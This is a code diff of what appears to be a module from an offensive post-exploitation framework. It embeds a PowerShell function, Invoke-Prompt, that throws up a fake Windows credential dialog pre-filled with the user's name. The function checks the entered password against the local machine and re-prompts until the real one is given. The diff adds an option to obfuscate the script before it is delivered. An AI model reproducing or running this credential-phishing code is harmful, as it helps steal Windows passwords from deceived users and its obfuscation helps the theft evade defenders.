@@ -15,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'http://blog.logrhythm.com/security/do-you-trust-your-computer/'
                 'https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/'
@@ -57,7 +57,7 @@ class Module:
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -65,8 +65,8 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         script = """
 # Adapted from http://blog.logrhythm.com/security/do-you-trust-your-computer/
 # https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
@@ -89,14 +89,14 @@ function Invoke-Prompt {
     Add-Type -assemblyname System.DirectoryServices.AccountManagement
     $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 
-    
+
     if($MsgText -and $($MsgText -ne '')){
         $null = [Microsoft.VisualBasic.Interaction]::MsgBox($MsgText, "OKOnly,MsgBoxSetForeground,SystemModal,$IconType", $Title)
     }
-    
+
     $c=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
     $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", $c, "NetBiosUserName")
-    
+
     if($credential){
            while($DS.ValidateCredentials($c, $credential.GetNetworkCredential().password) -ne $True){
               $credential = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
@@ -108,7 +108,7 @@ function Invoke-Prompt {
     }
 }
 Invoke-Prompt """
-   
+
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
@@ -118,4 +118,9 @@ Invoke-Prompt """
                     else:
                         script += " -" + str(option) + " \"" + str(values['Value'].strip("\"")) + "\""
 
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
